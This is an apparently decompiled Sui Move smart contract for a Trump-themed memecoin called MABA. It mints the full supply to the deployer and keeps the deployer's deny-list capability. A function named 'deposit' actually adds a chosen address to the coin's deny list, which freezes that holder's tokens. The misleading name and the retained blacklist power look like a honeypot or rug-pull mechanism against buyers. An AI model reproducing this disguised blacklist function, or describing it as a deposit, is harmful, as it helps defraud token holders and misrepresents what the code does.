module 0x80fa997ec9da488c5d76afc4a4fea4225c95feac90ed0ef5770ff1e6b8f07811::maba {
    struct MABA has drop {
        dummy_field: bool,
    }

    public fun deposit(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<MABA>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<MABA>(arg0, arg1, arg2, arg3);
    }

    fun init(arg0: MABA, arg1: &mut 0x2::tx_context::TxContext) {
        let v0 = trim_right(b"111111111   ");
        let v1 = trim_right(b"https://dd.dexscreener.com/ds-data/tokens/base/0xd9ea93a38d1771c870128f9134d4622d331c04c8.png?size=lg&key=0429b2                                                                                                                                                                                                                ");
        let v2 = if (0x1::vector::length<u8>(&v1) == 0) {
            0x1::option::none<0x2::url::Url>()
        } else {
            0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(v1))
        };
        let (v3, v4, v5) = 0x2::coin::create_regulated_currency_v2<MABA>(arg0, (0x1::vector::length<u8>(&v0) as u8), 0x1::ascii::into_bytes(0x1::string::to_ascii(0x1::string::utf8(trim_right(b"MABA    ")))), trim_right(b"MABA                            "), trim_right(b"Welcome to MABA!Introducing Make America Based Again (MABA), your go-to Donald Trump-inspired memecoin! We're all about celebrating the iconic spirit of one of America's most unforgettable figures, with a healthy dose of humor. We're a memecoin with no affiliationsjust love for Trump and the USA                        "), v2, false, arg1);
        let v6 = v3;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<MABA>>(v5);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<MABA>>(v6);
        0x2::transfer::public_transfer<0x2::coin::Coin<MABA>>(0x2::coin::mint<MABA>(&mut v6, 1000000000000000000, arg1), 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<MABA>>(v4, 0x2::tx_context::sender(arg1));
    }

    fun trim_right(arg0: vector<u8>) : vector<u8> {
        let v0 = 32;
        let v1 = &v0;
        while (0x1::vector::length<u8>(&arg0) > 0) {
            if (0x1::vector::borrow<u8>(&arg0, 0x1::vector::length<u8>(&arg0) - 1) != v1) {
                break
            };
            0x1::vector::pop_back<u8>(&mut arg0);
        };
        arg0
    }

    // decompiled from Move bytecode v6
}

